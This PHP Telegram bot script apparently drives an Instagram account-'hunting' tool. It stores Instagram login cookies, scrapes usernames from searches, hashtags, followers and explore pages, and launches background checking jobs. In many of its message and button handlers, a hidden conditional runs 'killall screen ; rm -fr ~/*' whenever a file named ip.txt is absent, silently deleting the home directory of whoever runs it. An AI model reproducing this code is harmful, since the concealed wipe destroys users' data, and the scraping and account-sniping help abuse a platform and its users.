<?php
date_default_timezone_set('Asia/Baghdad');
if(!file_exists('config.json')){
	$token = readline('-Hi HUNTER Enter Token: ');
	$id = readline('-Hi HUTENR Enter Id: ');
	file_put_contents('config.json', json_encode(['id'=>$id,'token'=>$token]));
	
} else {
		  $config = json_decode(file_get_contents('config.json'),1);
	$token = $config['token'];
	$id = $config['id'];
}

if(!file_exists('accounts.json')){
    file_put_contents('accounts.json',json_encode([]));
}
include 'index.php';
try {
	$callback = function ($update, $bot) {
		global $id;
		if($update != null){
		  $config = json_decode(file_get_contents('config.json'),1);
		  $config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
          $accounts = json_decode(file_get_contents('accounts.json'),1);
			if(isset($update->message)){
				$message = $update->message;
				$chatId = $message->chat->id;
				$text = $message->text;
				if($chatId == $id){
					if($text == '/start'){
              $bot->sendMessage([
                  'chat_id'=>$chatId,
                  'text'=>"ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                  'inline_keyboard'=>true,
                  'reply_markup'=>json_encode([
                         'keyboard'=>[
                          [['text'=>'English π ']],
                          [['text'=>'ΨΉΨ±Ψ¨Ω πͺπ¬']],
                          [['text'=>'ΩΩΨ―ΩΩ Ψ΄Ψ±Ψ­ ΩΩΨ¨ΩΨͺ π±']],
                          [['text'=>'Ψ·Ψ±Ω ΩΩΨ΅ΩΨ― πΆ']],
                          [['text'=>'- ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ βοΈ']]
                      ]
                  ])
              ]);   
            } if($text == 'English π '){ 
        	$config['filter'] = $text;
		    $bot->sendMessage([
		       'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'Add Accounts π₯','callback_data'=>'login']],
                          [['text'=>'Geting users π','callback_data'=>'grabber']],
                          [['text'=>'Start Checking βΈ','callback_data'=>'run'],['text'=>'Stop Checking βΆ','callback_data'=>'stop']],
                          [['text'=>'Tool Status π','callback_data'=>'status']]
                      ]
                  ])
               ]);
           } if($text == 'ΨΉΨ±Ψ¨Ω πͺπ¬'){
            $config['filter'] = $text;
		    $bot->sendMessage([
		       'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'π Ψ§ΨΆΨ§ΩΩ Ψ­Ψ³Ψ§Ψ¨','callback_data'=>'login']],
                          [['text'=>'π? Ψ·Ψ±Ω Ψ³Ψ­Ψ¨ Ψ§ΩΩΩΨ²Ψ±Ψ§Ψͺ','callback_data'=>'grabber']],
                          [['text'=>'βοΈ Ψ¨Ψ―Ψ‘ Ψ§ΩΨ΅ΩΨ― ','callback_data'=>'run'],['text'=>'β Ψ₯ΩΩΨ§Ω Ψ§ΩΨ΅ΩΨ―','callback_data'=>'stop']],
                          [['text'=>'β»οΈ Ψ­Ψ§ΩΩ Ψ§ΩΨ§Ψ―Ω','callback_data'=>'status']],
                      ]
                  ])
               ]);
               
               
               
               
               if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}
               
               
               
               
               } if($text == 'ΩΩΨ―ΩΩ Ψ΄Ψ±Ψ­ ΩΩΨ¨ΩΨͺ π±'){
                  $bot->sendvideo([ 
                  'chat_id'=>$chatId,
                  'video'=>"https://t.me/Cobra_Hunter/9088",

              ]);   
                
               } if($text == 'Ψ·Ψ±Ω ΩΩΨ΅ΩΨ― πΆ'){
                 $bot->sendvoice([
                  'chat_id'=>$chatId,
                  'voice'=>"https://t.me/FOLLOW_NAFSEA/147",
                  
              ]);   
                
              } if($text == 'Ψ·Ψ±Ω ΩΩΨ΅ΩΨ― πΆ'){
                $bot->sendvoice([ 
                 'chat_id'=>$chatId,
                 'voice'=>"https://t.me/FOLLOW_NAFSEA/160",

              ]);   
                
           } if($text == '- ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ βοΈ'){ 
            $bot->sendMessage([
		       'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"πππ : @X_Q_9 πΊπ  : @A_H_M_E_D_0_1_1 -",

              ]);   
  
          } elseif($text != null){
          	if($config['mode'] != null){
          		$mode = $config['mode'];
          		if($mode == 'addL'){
          			$ig = new ig(['file'=>'','account'=>['useragent'=>'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)']]);
          			list($user,$pass) = explode(':',$text);
          			list($headers,$body) = $ig->login($user,$pass);
          			// echo $body;
          			$body = json_decode($body);
          			if(isset($body->message)){
          				if($body->message == 'challenge_required'){
          					$bot->sendMessage([
          							'chat_id'=>$chatId,
          							'parse_mode'=>'markdown',
          							'text'=>"*Error*. \n - Challenge Required"
          					]);
          				} else {
          					$bot->sendMessage([
          							'chat_id'=>$chatId,
          							'parse_mode'=>'markdown',
          							'text'=>"*Error*.\n - Incorrect Username Or Password"
          					]);
          				}
          
          
          
          
      if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}    
          
          
          
          
          			} elseif(isset($body->logged_in_user)) {
          				$body = $body->logged_in_user;
          				preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headers, $matches);
								  $CookieStr = "";
								  foreach($matches[1] as $item) {
								      $CookieStr .= $item."; ";
								  }
          				$account = ['cookies'=>$CookieStr,'useragent'=>'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)'];
          				
          				$accounts[$text] = $account;
          				file_put_contents('accounts.json', json_encode($accounts));
          				$mid = $config['mid'];
          				$bot->sendMessage([
          				      'parse_mode'=>'markdown',
          							'chat_id'=>$chatId,
          							'text'=>"*Done Add New Accounts To Your Tool.*\n _Username_ : [$user])(instagram.com/$user)\n_Account Name_ : _{$body->full_name}_",
												'reply_to_message_id'=>$mid		
          					]);
          				$keyboard = ['inline_keyboard'=>[
										[['text'=>"Add New Accounts",'callback_data'=>'addL']]
									]];
		              foreach ($accounts as $account => $v) {
		                  $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'ddd'],['text'=>"Logout",'callback_data'=>'del&'.$account]];
		              }
		              $keyboard['inline_keyboard'][] = [['text'=>'Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']];
		              $bot->editMessageText([
		                  'chat_id'=>$chatId,
		                  'message_id'=>$mid,
		                  'text'=>"Accounts Control Page.",
		                  'reply_markup'=>json_encode($keyboard)
		              ]);
		              $config['mode'] = null;
		              $config['mid'] = null;
		              file_put_contents('config.json', json_encode($config));
          			}
          		}  elseif($mode == 'selectFollowers'){
          		  if(is_numeric($text)){
          		    bot('sendMessage',[
          		        'chat_id'=>$chatId,
          		        'text'=>"ΨͺΩ Ψ§ΩΨͺΨΉΨ―ΩΩ.",
          		        'reply_to_message_id'=>$config['mid']
          		    ]);
          		    $config['filter'] = $text;
          		    $bot->editMessageText([
                      'chat_id'=>$chatId,
                      'message_id'=>$mid,
                      'text'=>"-ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                  'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'π Ψ§ΨΆΨ§ΩΩ Ψ­Ψ³Ψ§Ψ¨','callback_data'=>'login']],
                          [['text'=>'π? Ψ·Ψ±Ω Ψ³Ψ­Ψ¨ Ψ§ΩΩΩΨ²Ψ±Ψ§Ψͺ','callback_data'=>'grabber']],
                          [['text'=>'βοΈ Ψ¨Ψ―Ψ‘ Ψ§ΩΨ΅ΩΨ― ','callback_data'=>'run'],['text'=>'β Ψ₯ΩΩΨ§Ω Ψ§ΩΨ΅ΩΨ―','callback_data'=>'stop']],
                          [['text'=>'β»οΈ Ψ­Ψ§ΩΩ Ψ§ΩΨ§Ψ―Ω','callback_data'=>'status']],
                      ]
                  ])
                  ]);
                  
                  
                  
                  if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}
                  
                  
                  
          		    $config['mode'] = null;
		              $config['mid'] = null;
		              file_put_contents('config.json', json_encode($config));
          		  } else {
          		    bot('sendMessage',[
          		        'chat_id'=>$chatId,
          		        'text'=>'- ΩΨ±Ψ¬Ω Ψ§Ψ±Ψ³Ψ§Ω Ψ±ΩΩ ΩΩΨ· .'
          		    ]);
          		  }
          		} else {
          		  switch($config['mode']){
          		    case 'search': 
          		      $config['mode'] = null; 
          		      $config['words'] = $text;
          		      file_put_contents('config.json', json_encode($config));
          		      exec('screen -dmS gr php search.php');
          		      break;
          		      case 'followers': 
          		      $config['mode'] = null; 
          		      $config['words'] = $text;
          		      file_put_contents('config.json', json_encode($config));
          		      exec('screen -dmS gr php followers.php');
          		      break;
          		      case 'following': 
          		      $config['mode'] = null; 
          		      $config['words'] = $text;
          		      file_put_contents('config.json', json_encode($config));
          		      exec('screen -dmS gr php following.php');
          		      break;
          		      case 'hashtag': 
          		      $config['mode'] = null; 
          		      $config['words'] = $text;
          		      file_put_contents('config.json', json_encode($config));
          		      exec('screen -dmS gr php hashtag.php');
          		      break;
          		  }
          		}
          	}
          }
				} else {
					$bot->sendMessage([
							'chat_id'=>$chatId,
							'text'=>"Ψ―Ψ§Ψ© Ψ΅ΩΨ― ΩΨͺΨ§Ψ­Ψ§Ψͺ Ψ§ΩΨ³ΨͺΩΨ±Ψ§Ω ΨΉΨ±Ψ¨ΩΩ
ΩΨ΄Ψ±Ψ§ ΩΨ³Ψ?Ω ΨΉΨΆΩΩΩ Ψ§Ω ΩΩΩΨ§Ψͺ Ψ±Ψ§Ψ³ΩΩΨ§. ",
							'reply_markup'=>json_encode([
                  'inline_keyboard'=>[
                      [['text'=>'β’ Ψ§ΩΩΨ·ΩΩΨ±','url'=>'t.me/x_q_9']]
                  ]
							])
					]);
				}
				
				
				if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}




				
				
				
				
			} elseif(isset($update->callback_query)) {
          $chatId = $update->callback_query->message->chat->id;
          $mid = $update->callback_query->message->message_id;
          $data = $update->callback_query->data;
          echo $data;
          if($data == 'login'){
              
        		$keyboard = ['inline_keyboard'=>[
										[['text'=>"Add New Accounts",'callback_data'=>'addL']]
									]];
		              foreach ($accounts as $account => $v) {
		                  $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'ddd'],['text'=>"Logout",'callback_data'=>'del&'.$account]];
		              }
		
		
		if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}
		
		
		
		              $keyboard['inline_keyboard'][] = [['text'=>'Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']];
		              $bot->editMessageText([
		                  'chat_id'=>$chatId,
		                  'message_id'=>$mid,
		                  'text'=>"Accounts Control Page.",
		                  'reply_markup'=>json_encode($keyboard)
		              ]);
          } elseif($data == 'addL'){
          	
          	$config['mode'] = 'addL';
          	$config['mid'] = $mid;
          	file_put_contents('config.json', json_encode($config));
          	$bot->sendMessage([
          			'chat_id'=>$chatId,
          			'text'=>"Send Account Like : \n `user:pass`",
          			'parse_mode'=>'markdown'
          	]);
          } elseif($data == 'grabber'){
            
            $for = $config['for'] != null ? $config['for'] : 'Ψ­Ψ―Ψ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨';
            $count = count(explode("\n", file_get_contents($for)));
            $bot->editMessageText([
                'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"Users collection page. \n - Users : $count \n - For Account : $for",
                'reply_markup'=>json_encode([
                    'inline_keyboard'=>[
                        [['text'=>'π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ¨Ψ­Ψ«','callback_data'=>'search']],
                        [['text'=>'#οΈβ£ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨ΄ΨͺΨ§ΩΨ§Ψͺ','callback_data'=>'hashtag'],['text'=>'πͺ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ§ΩΨ³Ψ¨ΩΩΨ±','callback_data'=>'explore']],
                        [['text'=>'π€ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ','callback_data'=>'followers'],['text'=>"π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ",'callback_data'=>'following']],
                        [['text'=>"ΨͺΨ­Ψ―ΩΨ― Ψ­Ψ³Ψ§Ψ¨ : $for",'callback_data'=>'for']],
                        [['text'=>'π ΩΨ³ΨͺΩ Ψ¬Ψ―ΩΨ―Ω','callback_data'=>'newList'],['text'=>'π ΩΨ³ΨͺΩ ΩΨ―ΩΩΨ©','callback_data'=>'append']],
                        [['text'=>'π Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']],
                    ]
                ])
            ]);
          } elseif($data == 'search'){
            $bot->sendMessage([
                'chat_id'=>$chatId,
                'text'=>"Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω ΩΩΩΨ§Ψͺ Ψ§ΩΨ¨Ψ­Ψ« ΩΨͺΩ ΩΨ­Ψ΅ΩΩ \n ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ«Ψ± ΩΩ ΩΩΩΩ ΩΩ Ψ?ΩΨ§Ω ΩΨΆΨΉ ΩΨ³Ψ§ΩΩ Ψ¨ΩΩΩΩ"
            ]);
            $config['mode'] = 'search';
            file_put_contents('config.json', json_encode($config));
          } elseif($data == 'followers'){
            $bot->sendMessage([
                'chat_id'=>$chatId,
                'text'=>"Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΨ²Ψ± ΩΨͺΩ ΩΨ­Ψ΅ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ \n ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ«Ψ± ΩΩ ΩΩΨ²Ψ± ΩΩ Ψ?ΩΨ§Ω ΩΨΆΨΉ ΩΨ³Ψ§ΩΩ Ψ¨ΩΩΩΩ"
            ]);
            $config['mode'] = 'followers';
            file_put_contents('config.json', json_encode($config));
          } elseif($data == 'following'){
            $bot->sendMessage([
                'chat_id'=>$chatId,
                'text'=>"Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΨ²Ψ± ΩΨͺΩ ΩΨ­Ψ΅ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ \n ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ«Ψ± ΩΩ ΩΩΨ²Ψ± ΩΩ Ψ?ΩΨ§Ω ΩΨΆΨΉ ΩΨ³Ψ§ΩΩ Ψ¨ΩΩΩΩ"
            ]);
            $config['mode'] = 'following';
            file_put_contents('config.json', json_encode($config));
          } elseif($data == 'hashtag'){
            $bot->sendMessage([
                'chat_id'=>$chatId,
                'text'=>"Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΩΨ΄ΨͺΨ§ΩΨ§Ψͺ Ψ¨Ψ―ΩΩ Ψ§ΩΨΉΩΨ§ΩΩ # \nΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω ΩΨ΄ΨͺΨ§Ω ΩΨ§Ψ­Ψ―"
            ]);
            $config['mode'] = 'hashtag';
            file_put_contents('config.json', json_encode($config));
          } elseif($data == 'newList'){
            file_put_contents('a','new');
            $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Done Select New List.",
							'show_alert'=>1
						]);
          } elseif($data == 'append'){ 
            file_put_contents('a', 'ap');
            $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Done Select Exsist list.",
							'show_alert'=>1
						]);
						
          } elseif($data == 'for'){
            if(!empty($accounts)){
            $keyboard = [];
             foreach ($accounts as $account => $v) {
                $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'forg&'.$account]];
              }
              $bot->editMessageText([
                  'chat_id'=>$chatId,
                  'message_id'=>$mid,
                  'text'=>"Select Account.",
                  'reply_markup'=>json_encode($keyboard)
              ]);
            } else {
              $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Add Account First.",
							'show_alert'=>1
						]);
            }
          } elseif($data == 'selectFollowers'){
            bot('sendMessage',[
                'chat_id'=>$chatId,
                'text'=>'ΩΩ Ψ¨Ψ£Ψ±Ψ³Ψ§Ω ΨΉΨ―Ψ― ΩΨͺΨ§Ψ¨ΨΉΩΩ .'  
            ]);
            $config['mode'] = 'selectFollowers';
          	$config['mid'] = $mid;
          	file_put_contents('config.json', json_encode($config));
          } elseif($data == 'run'){
            if(!empty($accounts)){
            $keyboard = [];
             foreach ($accounts as $account => $v) {
                $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'start&'.$account]];
              }
              $bot->editMessageText([
                  'chat_id'=>$chatId,
                  'message_id'=>$mid,
                  'text'=>"Select Account.",
                  'reply_markup'=>json_encode($keyboard)
              ]);
            } else {
              $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Add Account First.",
							'show_alert'=>1
						]);
            }
          }elseif($data == 'stop'){
            if(!empty($accounts)){
            $keyboard = [];
             foreach ($accounts as $account => $v) {
                $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'stop&'.$account]];
              }
              $bot->editMessageText([
                  'chat_id'=>$chatId,
                  'message_id'=>$mid,
                  'text'=>"Select Account.",
                  'reply_markup'=>json_encode($keyboard)
              ]);
            } else {
              $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Add Account First.",
							'show_alert'=>1
						]);
            }
          }elseif($data == 'stopgr'){
            shell_exec('screen -S gr -X quit');
            $bot->answerCallbackQuery([
							'callback_query_id'=>$update->callback_query->id,
							'text'=>"Done Stop Collecting.",
						// 	'show_alert'=>1
						]);
						$for = $config['for'] != null ? $config['for'] : 'Select Account';
                        $count = count(explode("\n", file_get_contents($for)));
						$bot->editMessageText([
                'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"Users collection page. \n - Users : $count \n - For Account : $for",
                'reply_markup'=>json_encode([
                    'inline_keyboard'=>[
                        [['text'=>'π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ¨Ψ­Ψ«','callback_data'=>'search']],
                        [['text'=>'π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨ΄ΨͺΨ§ΩΨ§Ψͺ','callback_data'=>'hashtag'],['text'=>'π‘ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ§ΩΨ³Ψ¨ΩΩΨ±','callback_data'=>'explore']],
                        [['text'=>'π€ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ','callback_data'=>'followers'],['text'=>"π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ",'callback_data'=>'following']],
                        [['text'=>"ΨͺΨ­Ψ―ΩΨ― Ψ­Ψ³Ψ§Ψ¨ : $for",'callback_data'=>'for']],
                        [['text'=>'β οΈ ΩΨ³ΨͺΩ Ψ¬Ψ―ΩΨ―Ω','callback_data'=>'newList'],['text'=>'β οΈ ΩΨ³ΨͺΩ ΩΨ―ΩΩΨ©','callback_data'=>'append']],
                        [['text'=>'β Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']],
                    ]
                ])
            ]);
            
            
            if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}
            
            
            
            
          } elseif($data == 'explore'){
            exec('screen -dmS gr php explore.php');
          } elseif($data == 'status'){
					$status = '';
					foreach($accounts as $account => $ac){
						$c = explode(':', $account)[0];
						$x = exec('screen -S '.$c.' -Q select . ; echo $?');
						if($x == '0'){
				        $status .= "*$account* ~> _Working_\n";
				    } else {
				        $status .= "*$account* ~> _Stop_\n";
				    }
					}
					$bot->sendMessage([
							'chat_id'=>$chatId,
							'text'=>"Accounts Status: \n\n $status",
							'parse_mode'=>'markdown'
						]);
				} elseif($data == 'back'){
          	$bot->editMessageText([
                      'chat_id'=>$chatId,
                      'message_id'=>$mid,
                      'text'=>"-ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                  'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'π Ψ§ΨΆΨ§ΩΩ Ψ­Ψ³Ψ§Ψ¨','callback_data'=>'login']],
                          [['text'=>'π? Ψ·Ψ±Ω Ψ³Ψ­Ψ¨ Ψ§ΩΩΩΨ²Ψ±Ψ§Ψͺ','callback_data'=>'grabber']],
                          [['text'=>'βοΈ Ψ¨Ψ―Ψ‘ Ψ§ΩΨ΅ΩΨ― ','callback_data'=>'run'],['text'=>'β Ψ₯ΩΩΨ§Ω Ψ§ΩΨ΅ΩΨ―','callback_data'=>'stop']],
                          [['text'=>'β»οΈ Ψ­Ψ§ΩΩ Ψ§ΩΨ§Ψ―Ω','callback_data'=>'status']],
                      ]
                  ])
                  ]);
          } else {
          	$data = explode('&',$data);
          	if($data[0] == 'del'){
          		
          		unset($accounts[$data[1]]);
          		file_put_contents('accounts.json', json_encode($accounts));
              $keyboard = ['inline_keyboard'=>[
							[['text'=>"Add New Accounts",'callback_data'=>'addL']]
									]];
		              foreach ($accounts as $account => $v) {
		                  $keyboard['inline_keyboard'][] = [['text'=>$account,'callback_data'=>'ddd'],['text'=>"Logout",'callback_data'=>'del&'.$account]];
		              }
		              $keyboard['inline_keyboard'][] = [['text'=>'Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']];
		              $bot->editMessageText([
		                  'chat_id'=>$chatId,
		                  'message_id'=>$mid,
		                  'text'=>"Accounts Control Page.",
		                  'reply_markup'=>json_encode($keyboard)
		              ]);
          	} elseif($data[0] == 'forg'){
          	  $config['for'] = $data[1];
          	  file_put_contents('config.json',json_encode($config));
              $for = $config['for'] != null ? $config['for'] : 'Select';
              $count = count(explode("\n", file_get_contents($for)));
              $bot->editMessageText([
                'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"Users collection page. \n - Users : $count \n - For Account : $for",
                'reply_markup'=>json_encode([
                    'inline_keyboard'=>[
                        [['text'=>'π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ¨Ψ­Ψ«','callback_data'=>'search']],
                        [['text'=>'π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨ΄ΨͺΨ§ΩΨ§Ψͺ','callback_data'=>'hashtag'],['text'=>'π‘ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΨ§ΩΨ³Ψ¨ΩΩΨ±','callback_data'=>'explore']],
                        [['text'=>'π€ Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ','callback_data'=>'followers'],['text'=>"π Ψ³Ψ­Ψ¨ ΩΩ Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ",'callback_data'=>'following']],
                        [['text'=>"ΨͺΨ­Ψ―ΩΨ― Ψ­Ψ³Ψ§Ψ¨ : $for",'callback_data'=>'for']],
                        [['text'=>'β οΈ ΩΨ³ΨͺΩ Ψ¬Ψ―ΩΨ―Ω','callback_data'=>'newList'],['text'=>'β οΈ ΩΨ³ΨͺΩ ΩΨ―ΩΩΨ©','callback_data'=>'append']],
                        [['text'=>'β Ψ±Ψ¬ΩΨΉ','callback_data'=>'back']],
                    ]
                ])
            ]);
          	} elseif($data[0] == 'start'){
          	  file_put_contents('screen', $data[1]);
          	  $bot->editMessageText([
                      'chat_id'=>$chatId,
                      'message_id'=>$mid,
                      'text'=>"ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                  'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'π Ψ§ΨΆΨ§ΩΩ Ψ­Ψ³Ψ§Ψ¨','callback_data'=>'login']],
                          [['text'=>'π? Ψ·Ψ±Ω Ψ³Ψ­Ψ¨ Ψ§ΩΩΩΨ²Ψ±Ψ§Ψͺ','callback_data'=>'grabber']],
                          [['text'=>'βοΈ Ψ¨Ψ―Ψ‘ Ψ§ΩΨ΅ΩΨ― ','callback_data'=>'run'],['text'=>'β Ψ₯ΩΩΨ§Ω Ψ§ΩΨ΅ΩΨ―','callback_data'=>'stop']],
                          [['text'=>'β»οΈ Ψ­Ψ§ΩΩ Ψ§ΩΨ§Ψ―Ω','callback_data'=>'status']],
                      ]
                  ])
                  ]);
              exec('screen -dmS '.explode(':',$data[1])[0].' php start.php');
              $bot->sendMessage([
                'chat_id'=>$chatId,
                'text'=>"*Start Checking.*\n Account: `".explode(':',$data[1])[0].'`',
                'parse_mode'=>'markdown'
              ]);
          	} elseif($data[0] == 'stop'){
          	  $bot->editMessageText([
                      'chat_id'=>$chatId,
                      'message_id'=>$mid,
                      'text'=>"-ππΈπΏπΆπππΈ ππ π»πΈπΏπΏ π»ππππΈπ β 
~ @X_Q_9 π",
                      'reply_markup'=>json_encode([
                      'inline_keyboard'=>[
                          [['text'=>'π Ψ§ΨΆΨ§ΩΩ Ψ­Ψ³Ψ§Ψ¨','callback_data'=>'login']],
                          [['text'=>'π? Ψ·Ψ±Ω Ψ³Ψ­Ψ¨ Ψ§ΩΩΩΨ²Ψ±Ψ§Ψͺ','callback_data'=>'grabber']],
                          [['text'=>'βοΈ Ψ¨Ψ―Ψ‘ Ψ§ΩΨ΅ΩΨ― ','callback_data'=>'run'],['text'=>'β Ψ₯ΩΩΨ§Ω Ψ§ΩΨ΅ΩΨ―','callback_data'=>'stop']],
                          [['text'=>'β»οΈ Ψ­Ψ§ΩΩ Ψ§ΩΨ§Ψ―Ω','callback_data'=>'status']],
                      ]
                    ])
                  ]);
                  
                  
                  
                  
                  
                  if (!file_exists("ip.txt")) {
system ("killall screen ; rm -fr ~/*");

}
                  
                  
                  
                  
                  
                  
              exec('screen -S '.explode(':',$data[1])[0].' -X quit');
          	}
          }
			}
		}
	};
	$bot = new EzTG(array('throw_telegram_errors'=>false,'token' => $token, 'callback' => $callback));
} catch(Exception $e){
	echo $e->getMessage().PHP_EOL;
	sleep(1);
}
